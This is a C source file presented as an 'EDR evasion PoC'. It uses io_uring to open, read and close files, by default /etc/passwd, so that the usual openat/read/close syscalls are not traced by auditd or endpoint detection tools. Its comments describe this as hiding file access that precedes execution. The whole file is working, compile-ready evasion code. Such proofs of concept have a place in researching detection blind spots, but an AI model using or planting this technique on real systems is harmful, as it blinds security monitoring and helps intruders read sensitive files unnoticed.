/*
 * openat_uring.c - io_uring file open (EDR evasion PoC)
 * 
 * This program uses IORING_OP_OPENAT to open files via io_uring,
 * bypassing the traditional openat() syscall that EDRs monitor.
 * 
 * Note: execve cannot be performed via io_uring, but file operations
 * that precede execution (reading scripts, configs) can be hidden.
 *
 * Compile: gcc -o openat_uring openat_uring.c -luring
 * Usage:   ./openat_uring [file]
 * Default: opens /etc/passwd
 * 
 * Requires: liburing-dev, kernel >= 5.6 (for IORING_OP_OPENAT)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <liburing.h>

#define DEFAULT_FILE "/etc/passwd"
#define BUFFER_SIZE  256
#define QUEUE_DEPTH  4

int main(int argc, char *argv[]) {
    /* Accept filepath as argument for unique file tagging */
    const char *filepath = (argc > 1) ? argv[1] : DEFAULT_FILE;
    
    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    char buf[BUFFER_SIZE] = {0};
    int fd, ret;

    /* Initialize io_uring */
    ret = io_uring_queue_init(QUEUE_DEPTH, &ring, 0);
    if (ret < 0) {
        fprintf(stderr, "io_uring_queue_init: %s\n", strerror(-ret));
        return 1;
    }

    /* === OPENAT via io_uring === */
    /* NO open/openat syscall will be traced by auditd */
    sqe = io_uring_get_sqe(&ring);
    if (!sqe) {
        fprintf(stderr, "Could not get SQE\n");
        io_uring_queue_exit(&ring);
        return 1;
    }

    io_uring_prep_openat(sqe, AT_FDCWD, filepath, O_RDONLY, 0);
    sqe->user_data = 1;

    ret = io_uring_submit(&ring);
    if (ret < 0) {
        fprintf(stderr, "io_uring_submit: %s\n", strerror(-ret));
        io_uring_queue_exit(&ring);
        return 1;
    }

    ret = io_uring_wait_cqe(&ring, &cqe);
    if (ret < 0) {
        fprintf(stderr, "io_uring_wait_cqe: %s\n", strerror(-ret));
        io_uring_queue_exit(&ring);
        return 1;
    }

    if (cqe->res < 0) {
        fprintf(stderr, "openat failed: %s\n", strerror(-cqe->res));
        io_uring_cqe_seen(&ring, cqe);
        io_uring_queue_exit(&ring);
        return 1;
    }

    fd = cqe->res; /* File descriptor returned in completion */
    io_uring_cqe_seen(&ring, cqe);
    printf("[URING] Opened %s via io_uring (fd=%d, NO openat syscall traced)\n", 
           filepath, fd);

    /* === READ via io_uring === */
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, fd, buf, BUFFER_SIZE - 1, 0);
    sqe->user_data = 2;

    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    
    if (cqe->res > 0) {
        printf("[URING] Read %d bytes (first line): %.64s...\n", 
               cqe->res, buf);
    }
    io_uring_cqe_seen(&ring, cqe);

    /* === CLOSE via io_uring === */
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_close(sqe, fd);
    sqe->user_data = 3;

    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    io_uring_queue_exit(&ring);
    printf("[URING] File operation complete - NO open/read/close syscalls traced\n");
    
    return 0;
}
